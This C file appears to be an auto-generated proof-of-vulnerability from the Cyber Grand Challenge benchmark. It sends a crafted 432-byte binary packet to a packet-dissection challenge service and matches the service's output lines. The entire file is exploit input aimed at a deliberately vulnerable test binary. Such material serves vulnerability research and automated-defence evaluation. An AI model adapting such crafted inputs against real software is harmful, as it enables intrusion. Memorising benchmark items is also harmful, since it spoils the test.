#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb0\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x98\x01\x00\x00\x90\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x90\x01\x00\x00"
         "\xa6\xd5\x14\x4a\x92\x6b\xca\x99\x0d\xf3\xb4\x17\x4d\xdd\x00\x08"
         "\x5d\x21\x00\x79\x0c\x00\x00\x00\x94\xe1\x99\x65\x33\xac\x61\x61"
         "\x9d\xc0\x6c\x5b\xb8\xe1\x56\xf6\xc3\x60\xef\xa8\x01\x00\x84\x01"
         "\x62\x2a\x2a\x2e\xb4\x6c\xdc\xd7\x1f\x01\x00\xc6\x41\x00\x4f\xea"
         "\x40\xb6\xc3\xf5\x01\x00\xeb\x10\x71\xb4\x5f\xf9\x25\x08\x37\x99"
         "\xdc\xaa\x81\xde\x85\xff\xb4\xd3\x8b\xf0\x4a\x01\xf2\xa8\xe7\xca"
         "\x24\x30\x72\xf8\x48\x18\x0e\x13\x98\x1f\x64\xc9\xe5\x36\xea\x6b"
         "\xf2\x53\x54\xae\x29\x53\x12\x84\xb3\x56\x02\x13\xcc\x89\xb7\x1d"
         "\xa2\xbf\x21\x0e\x7b\xe6\xce\x5e\x4b\xab\xa4\x8c\xdb\xbc\x18\x7e"
         "\x7b\x1b\xd9\xb1\xa5\xfc\x16\x88\x13\xa6\xdb\xac\x1e\x46\x1d\xb4"
         "\xa2\xe2\xd1\xe2\x6f\xf0\x48\x77\x89\x86\xee\x05\xa6\x36\x35\xa5"
         "\x7d\x3f\x63\xee\x5c\xdc\xf9\x5a\x47\xab\xec\x60\x01\x40\x58\x60"
         "\xad\x13\x72\xad\x9a\x96\xa6\x53\xa8\xc3\x48\xbb\xb4\x55\x3c\x6b"
         "\xd9\x4e\xba\xff\xc2\xc9\x62\x8f\xa4\x1a\xa7\xca\x04\x14\x9f\xe8"
         "\x2c\xb8\x88\xf8\x1f\x71\xeb\x23\xe3\xa5\xe1\xcf\x20\x46\x2f\x27"
         "\xfc\x94\x06\xb7\xee\x49\xcc\xb5\x69\x60\x02\x88\x6d\x06\xe0\xb2"
         "\x8a\x92\xb1\x6d\xbb\x12\xa9\x57\xb0\x98\x16\xec\xb1\x55\x1f\x4c"
         "\x8b\x04\x64\xec\x2e\xa5\x01\x8b\x37\xea\x41\x05\x7a\x28\x37\x7a"
         "\x90\xdf\x0a\xfe\xae\x8c\x98\xd4\x2d\x98\x17\x1f\x89\xd5\x32\x8a"
         "\xf7\x53\x77\x70\x3a\x0c\xe1\xfe\x21\x54\xe3\x17\xd7\xd2\x4a\xc0"
         "\x37\xdc\xb0\x7a\xd9\x9d\x5d\x27\xb5\x03\xb7\x58\x27\xcd\xc5\xa1"
         "\x58\xa3\x19\xf0\x1d\xfc\x95\x19\x07\x41\x00\xd7\xfa\xdf\x46\x41"
         "\x00\xfc\x51\x28\x07\x41\x00\x49\x22\x7e\x07\x56\xba\x7d\xa5\x41"
         "\x00\x01\x00\x6a\x01\x00\xfc\x01\x00\xa1\x5d\xaa\x05\x4f\x01\x00"
         "\x77\x82\x2d\xb0\x31\x7c\x41\x00\x6a\x9c\xbb\xd6\x4c\xbd\x10\x8b";
      static unsigned int write_00001_00000_len = 432;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamadoldrums
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x64\x6f\x6c\x64\x72\x75"
         "\x6d\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
